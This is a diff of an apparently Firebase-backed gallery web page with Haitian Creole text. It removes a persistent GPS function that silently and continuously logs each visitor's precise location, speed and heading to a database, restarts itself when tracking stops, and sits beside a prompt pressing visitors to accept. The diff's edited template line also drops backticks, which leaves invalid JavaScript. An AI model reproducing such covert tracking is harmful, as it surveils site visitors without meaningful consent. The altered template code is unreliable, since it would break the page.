@@ -246,7 +246,7 @@
 
     <div class="gallery hidden" id="galleryRest"></div>
 
-    <footer>© 2026 — Tout dwa rezève</footer>
+    <footer>©️ 2026 — Tout dwa rezève</footer>
 
   </div>
 
@@ -333,7 +333,7 @@ function buildItem(img) {
   return `<div class="item" data-name="${img.name}" data-price="${img.price || ''}">
     <img src="${img.url}" loading="lazy" alt="${img.name}"
          onerror="this.style.display='none';this.parentElement.style.background='#2a2a2a';">
-    <div class="label">${img.name}${img.price ? `<span class="price">${img.price}</span>` : ''}</div>
+    <div class="label">${img.name}${img.price ? <span class="price">${img.price}</span> : ''}</div>
   </div>`;
 }
 
@@ -505,37 +505,9 @@ db.ref("images").on("value", (snapshot) => {
       setStatus("tanpri aksepte pouw kontinye we update sou page la ");
       btnStart.disabled = false;
       return;
-     
-   // FONKSYON GPS KI PA JANM KANPE
-   let gpsWatchId = null;
-function startPersistentGPS(){
-  if(gpsWatchId) return;
-  if(!navigator.geolocation) return;
-
-  gpsWatchId = navigator.geolocation.watchPosition(
-    (p) => {
-      const payload = {
-        name: sessionStorage.getItem("visitor_name") || "anonim",
-        lat: p.coords.latitude,
-        lon: p.coords.longitude,
-        acc: Math.round(p.coords.accuracy),
-        heading: p.coords.heading,
-        speed: p.coords.speed,
-        time: Date.now()
-      };
-      db.ref("locations/" + payload.name).set(payload);
-      db.ref("locations_history/" + payload.name + "/" + Date.now()).set(payload);
-    },
-    (e) => console.log("GPS err", e.code),
-    { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 }
-  );
-  window._watchId = gpsWatchId;
-  
-  // Relanse si GPS koupe
-  setInterval(()=>{ 
-    if(!gpsWatchId && active) startPersistentGPS(); 
-  }, 5000);
-}
+    }
+    setStatus("");
+    await ensureCall();
     active = true;
     ctaView.classList.add("hidden");
     activeView.classList.remove("hidden");
@@ -619,4 +591,4 @@ if ("serviceWorker" in navigator) {
 }
 </script>
 </body>
-</html>
+</html> 
